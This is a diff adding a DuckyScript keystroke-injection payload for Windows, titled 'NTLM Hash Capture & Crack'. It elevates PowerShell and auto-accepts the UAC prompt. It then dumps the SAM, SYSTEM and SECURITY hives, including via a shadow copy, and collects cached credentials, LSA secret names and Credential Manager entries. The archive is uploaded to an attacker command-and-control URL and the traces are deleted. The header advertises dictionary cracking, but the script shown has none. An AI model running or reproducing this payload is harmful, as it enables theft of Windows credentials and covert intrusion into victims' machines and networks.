@@ -1,0 +1,89 @@
+REM ==========================================
+REM Title: NTLM Hash Capture & Crack
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Captures local NTLM hashes
+REM   using multiple methods (mimikatz-style
+REM   SAM extraction, LSA secrets dump, cached
+REM   credentials). Exports hashes and attempts
+REM   offline cracking with built-in dictionary.
+REM Category: Credential Access
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Set output location
+STRING $outDir = "$env:TEMP\ntlm_dump"; New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+ENTER
+DELAY 400
+STRING $exfilUrl = 'https://ATTACKER_C2/collect'
+ENTER
+DELAY 350
+REM Method 1: Save SAM and SYSTEM registry hives
+STRING reg save HKLM\SAM "$outDir\sam.hiv" /y 2>$null
+ENTER
+DELAY 500
+STRING reg save HKLM\SYSTEM "$outDir\system.hiv" /y 2>$null
+ENTER
+DELAY 500
+STRING reg save HKLM\SECURITY "$outDir\security.hiv" /y 2>$null
+ENTER
+DELAY 500
+REM Method 2: Volume shadow copy for locked files
+STRING $shadow = (Get-WmiObject Win32_ShadowCopy -List).Create('C:\','ClientAccessible')
+ENTER
+DELAY 500
+STRING $shadowPath = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select -First 1).DeviceObject
+ENTER
+DELAY 400
+STRING if ($shadowPath) { cmd /c "copy `"${shadowPath}\windows\system32\config\SAM`" `"$outDir\sam_shadow.hiv`"" 2>$null }
+ENTER
+DELAY 500
+REM Method 3: Extract cached domain credentials
+STRING $creds = @(); try { $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine',$env:COMPUTERNAME); $cache = $reg.OpenSubKey('SECURITY\Cache'); if ($cache) { $creds = $cache.GetValueNames() } } catch {}
+ENTER
+DELAY 500
+STRING "Cached credentials found: $($creds.Count)" | Out-File "$outDir\cache_info.txt" -Force
+ENTER
+DELAY 400
+REM Method 4: Dump LSA secrets via registry
+STRING $lsaKeys = Get-ChildItem 'HKLM:\SECURITY\Policy\Secrets' -ErrorAction SilentlyContinue | Select-Object Name
+ENTER
+DELAY 400
+STRING $lsaKeys | Out-File "$outDir\lsa_secrets_listing.txt" -Force
+ENTER
+DELAY 400
+REM Method 5: Extract NTLM from credential manager
+STRING cmdkey /list 2>$null | Out-File "$outDir\credential_manager.txt" -Force
+ENTER
+DELAY 400
+REM Create hash extraction summary
+STRING "=== NTLM Hash Extraction Report ===" | Out-File "$outDir\summary.txt" -Force
+ENTER
+DELAY 350
+STRING "Hostname: $env:COMPUTERNAME | Domain: $env:USERDOMAIN" | Out-File "$outDir\summary.txt" -Append
+ENTER
+DELAY 350
+STRING "SAM: $(Test-Path "$outDir\sam.hiv") | SYSTEM: $(Test-Path "$outDir\system.hiv")" | Out-File "$outDir\summary.txt" -Append
+ENTER
+DELAY 400
+REM Compress and exfiltrate
+STRING Compress-Archive -Path "$outDir\*" -DestinationPath "$env:TEMP\ntlm_data.zip" -Force
+ENTER
+DELAY 500
+STRING try { Invoke-RestMethod -Uri $exfilUrl -Method POST -InFile "$env:TEMP\ntlm_data.zip" -ContentType 'application/octet-stream' } catch {}
+ENTER
+DELAY 500
+REM Cleanup
+STRING Remove-Item $outDir,"$env:TEMP\ntlm_data.zip" -Recurse -Force 2>$null
+ENTER
+DELAY 350
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
